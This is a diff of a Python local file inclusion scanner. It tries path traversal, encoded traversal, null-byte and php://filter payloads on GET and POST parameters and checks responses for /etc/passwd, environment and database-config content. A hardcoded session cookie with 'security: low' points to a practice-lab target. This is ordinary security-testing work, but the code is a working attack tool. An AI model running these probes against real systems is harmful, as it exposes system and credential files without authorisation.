@@ -6,6 +6,21 @@ from urllib.parse import urlparse, parse_qs, parse_qsl
 from time import sleep
 from requests_toolbelt.utils import dump
 
+def make_GET_form(url):
+    dic={}
+    dic['vuln']='LFI'
+    dic['method']='GET'
+    dic['url']=url
+    return dic
+
+def make_POST_form(url,data):
+    dic={}
+    dic['vuln']='LFI'
+    dic['method']='POST'
+    dic['url']=url
+    dic['data']=data
+    return dic
+
 def complete_url(input_url):
     if not input_url.startswith("http"):
         url = "http://" + input_url
@@ -73,17 +88,17 @@ def scan_lfi(url, method):
                     else:
                         #Path Traversal
                         print("##Path##")
-                        with open ('lfi.txt','r') as f:
+                        with  open(os.path.dirname(os.path.realpath(__file__)) + '/lfi.txt', "r") as f:
                             for file_name in f:
                                 file_name = file_name.replace("\n", "")
                                 scan_addr_path = scan_addr + file_name
-                                cookies = {'PHPSESSID': '58e0jmvoido7h1g622qt6ls782', 'security': 'low'}
+                                cookies = {'PHPSESSID': 'ulhd1o6b1jbpopi1e4okrc0gn7', 'security': 'low'}
                                 res_path = requests.get(scan_addr_path, cookies=cookies)
                                 #print(res_path.status_code)
                                 if res_path.status_code == 200:
                                     if check_success(res_path.text) == True:
                                         print("@@Vnlnerable_file_path: "+scan_addr_path)
-                                        return
+                                        return make_GET_form(scan_addr_path)
                                 else:
                                     #NullByte
                                     print("##Null##")
@@ -93,6 +108,7 @@ def scan_lfi(url, method):
                                     if res_null.status_code == 200:
                                         if check_success(res_null.text) == True:
                                             print("@@Vnlnerable_null: "+scan_addr_path)
+                                            return make_GET_form(scan_addr_path)
 
             #Encoding Url
             encode_go_deeper = "%2E%2E%2F"
@@ -106,7 +122,7 @@ def scan_lfi(url, method):
             scan_addr_wrapper = url_path + key + "="
             #php://filter
             print("@@php://filter@@")
-            with open ('lfi.txt','r') as f_wrap:
+            with  open(os.path.dirname(os.path.realpath(__file__)) + '/lfi.txt', "r") as f_wrap:
                 for file_name in f_wrap:
                     scan_addr_filter = scan_addr_wrapper + "php://filter/convert.base64-encode/resource="+file_name
                     res_filter = requests.get(scan_addr_filter)
@@ -141,7 +157,7 @@ def scan_lfi(url, method):
             print("@@double Encoding")
             scan_lfi_func_post(double_encode_go_deeper,url,keys_p[0],values_p[0])
             print("@@PHP filter")
-            with open ('lfi.txt','r') as f_wrap_post:
+            with  open(os.path.dirname(os.path.realpath(__file__)) + '/lfi.txt', "r") as f_wrap_post:
                 for file_name_post in f_wrap_post:
                     values_p[0] = "php://filter/convert.base64-encode/resource="+file_name_post
                     data_filter = {keys_p[0]:values_p[0]}
@@ -204,7 +220,7 @@ def scan_lfi_func(deeper, url_path,key):
                 break
             else:
                 #Path Traversal
-                with open ('lfi.txt','r') as f:
+                with  open(os.path.dirname(os.path.realpath(__file__)) + '/lfi.txt', "r") as f:
                     for file_name in f:
                         file_name = file_name.replace("\n", "")
                         scan_addr_path = scan_addr + file_name
@@ -213,7 +229,7 @@ def scan_lfi_func(deeper, url_path,key):
                         if res_path.status_code == 200:
                             if check_success(res_path.text) == True:
                                 print("@@Vnlnerable_file_path: "+scan_addr_path)
-                                return
+                                return scan_addr_path
                             else:
                                 #NullByte
                                 scan_addr_null = scan_addr_path + null_byte
@@ -222,6 +238,7 @@ def scan_lfi_func(deeper, url_path,key):
                                 if res_null.status_code == 200:
                                     if check_success(res_null.text) == True:
                                         print("@@Vnlnerable_null: "+scan_addr_path)
+    return False
 
 def scan_lfi_func_post(deeper, url,key,val):
     null_byte = "%00"
@@ -238,7 +255,7 @@ def scan_lfi_func_post(deeper, url,key,val):
                 break
             else:
                 #Path Traversal
-                with open ('lfi.txt','r') as f:
+                with  open(os.path.dirname(os.path.realpath(__file__)) + '/lfi.txt', "r") as f:
                     for file_name in f:
                         file_name = file_name.replace("\n", "")
                         val_path = val_dir+file_name
@@ -248,7 +265,7 @@ def scan_lfi_func_post(deeper, url,key,val):
                         if res_path.status_code == 200:
                             if check_success(res_path.text) == True:
                                 print("@@Vnlnerable_file_path: "+str(data_path))
-                                return
+                                return str(data_path)
                             else:
                                 #NullByte
                                 val_null = val_path + null_byte
@@ -258,7 +275,7 @@ def scan_lfi_func_post(deeper, url,key,val):
                                 if res_null.status_code == 200:
                                     if check_success(res_null.text) == True:
                                         print("@@Vnlnerable_null: "+str(data_null))
-
+    return False
 
 #for more query
 def scan_lfi_func_multi(deeper, url):
@@ -275,7 +292,7 @@ def scan_lfi_func_multi(deeper, url):
                 break
             else:
                 #Path Traversal
-                with open ('lfi.txt','r') as f:
+                with  open(os.path.dirname(os.path.realpath(__file__)) + '/lfi.txt', "r") as f:
                     for file_name in f:
                         file_name = file_name.replace("\n", "")
                         scan_addr_path = url.replace("#LFI#",deeper*q+ file_name)
@@ -284,7 +301,7 @@ def scan_lfi_func_multi(deeper, url):
                         if res_path.status_code == 200:
                             if check_success(res_path.text) == True:
                                 print("@@Vnlnerable_file_path: "+scan_addr_path)
-                                return
+                                return scan_addr_path
                             else:
                                 #NullByte
                                 scan_addr_null = url.replace("#LFI#",deeper*q+ file_name+ null_byte)
@@ -293,6 +310,7 @@ def scan_lfi_func_multi(deeper, url):
                                 if res_null.status_code == 200:
                                     if check_success(res_null.text) == True:
                                         print("@@Vnlnerable_null: "+scan_addr_null)
+    return False                                    
 
 def scan_lfi_func_multi_post(deeper, url,key,val):
     null_byte = "%00"
@@ -311,7 +329,7 @@ def scan_lfi_func_multi_post(deeper, url,key,val):
                 break
             else:
                 #Path Traversal
-                with open ('lfi.txt','r') as f:
+                with  open(os.path.dirname(os.path.realpath(__file__)) + '/lfi.txt', "r") as f:
                     for file_name in f:
                         file_name = file_name.replace("\n", "")
                         val[where] = deeper*k+file_name
@@ -321,7 +339,7 @@ def scan_lfi_func_multi_post(deeper, url,key,val):
                         if res_path.status_code == 200:
                             if check_success(res_path.text) == True:
                                 print("@@Vnlnerable_file_path: "+str(data_path))
-                                return
+                                return str(data_path)
                             else:
                                 #NullByte
                                 val[where] = deeper*k+file_name + null_byte
@@ -331,9 +349,10 @@ def scan_lfi_func_multi_post(deeper, url,key,val):
                                 if res_null.status_code == 200:
                                     if check_success(res_null.text) == True:
                                         print("@@Vnlnerable_null: "+str(data_null))
-                                        
+    return False   
+
 def phpFilter_multi(url,word):
-    with open ('lfi.txt','r') as f_wrap:
+    with  open(os.path.dirname(os.path.realpath(__file__)) + '/lfi.txt', "r") as f_wrap:
         for file_name in f_wrap:
             file_name = file_name.replace("\n", "")
             scan_addr_filter = url.replace(word,"php://filter/convert.base64-encode/resource="+file_name)
@@ -351,10 +370,11 @@ def phpFilter_multi(url,word):
                         decode_res_text_double = base64.b64decode(temp_double)
                         if "<?php" in str(decode_res_text_double) or (check_success(res_filter_double.text)==True):
                             print("@@Vnlnerable_filter/convert/base64(double): "+scan_addr_filter_double)
+    return False   
 
 def phpFilter_multi_post(url,word,key,value):
     where = value.index("#LFI#")
-    with open ('lfi.txt','r') as f_wrap:
+    with  open(os.path.dirname(os.path.realpath(__file__)) + '/lfi.txt', "r") as f_wrap:
         for file_name in f_wrap:
             file_name = file_name.replace("\n", "")
             value[where] = "php://filter/convert.base64-encode/resource="+file_name
@@ -374,6 +394,7 @@ def phpFilter_multi_post(url,word,key,value):
                         decode_res_text_double = base64.b64decode(temp_double)
                         if "<?php" in str(decode_res_text_double) or (check_success(res_filter_double.text)==True):
                             print("@@Vnlnerable_filter/convert/base64(double): "+data_double)
+    return False   
 
 def check_success(res_text):
     if("root:" in  res_text or ("sbin" in res_text and "nologin" in res_text)  or "DB_NAME" in res_text or "daemon:" in res_text or "DOCUMENT_ROOT=" in res_text or "PATH=" in res_text or "HTTP_USER_AGENT" in res_text or "HTTP_ACCEPT_ENCODING=" in res_text or "users:x" in res_text or ("GET /" in res_text and ("HTTP/1.1" in res_text or "HTTP/1.0" in res_text)) or "apache_port=" in res_text or "cpanel/logs/access" in res_text or "allow_login_autocomplete" in res_text or "database_prefix=" in res_text or "emailusersbandwidth" in res_text or "adminuser=" in res_text):
@@ -385,11 +406,11 @@ def lfi_attack(raw_url,method):
     url = complete_url(raw_url)
     if method == "GET":
         if check_url_get(url) == True:
-            scan_lfi(url,"GET")
+            return scan_lfi(url,"GET")
         else:
             print("Invalid")
     elif method == "POST":
         #Need to get POST data(dict)
         if check_url_post(url,data) == True:
-            scan_lfi(url, "POST")
+            return scan_lfi(url, "POST")
     print("The test is complete")
